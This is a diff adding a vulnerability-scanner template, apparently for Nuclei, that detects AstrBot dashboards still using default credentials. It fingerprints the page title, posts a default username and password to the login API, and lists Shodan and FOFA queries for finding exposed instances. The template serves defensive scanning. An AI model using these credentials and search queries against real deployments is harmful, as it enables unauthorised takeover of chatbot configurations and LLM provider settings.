@@ -1,0 +1,68 @@
+flow: http(1) && http(2)
+http:
+- matchers:
+  - internal: true
+    part: body
+    type: word
+    words:
+    - <title>AstrBot
+  - internal: true
+    status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/'
+- attack: pitchfork
+  matchers:
+  - part: body
+    type: word
+    words:
+    - '"token"'
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    password:
+    - 77b90590a8945a7d36c963981a307dc9
+    username:
+    - astrbot
+  raw:
+  - 'POST /api/auth/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+
+    {"username":"{{username}}","password":"{{password}}"}
+
+    '
+id: astrbot-default-login
+info:
+  author: theamanrawat
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id:
+    - CWE-798
+  description: 'AstrBot contains a default login vulnerability. An attacker can access
+    the AstrBot dashboard using default credentials and gain control over the chatbot
+    framework, modify configurations, manage LLM providers, and execute unauthorized
+    operations.
+
+    '
+  metadata:
+    fofa-query: body="<title>AstrBot"
+    max-request: 2
+    product: astrbot
+    shodan-query: html:"<title>AstrBot"
+    vendor: soulter
+    verified: true
+  name: AstrBot - Default Login
+  reference:
+  - https://github.com/Soulter/AstrBot
+  severity: high
+  tags: astrbot, default-login
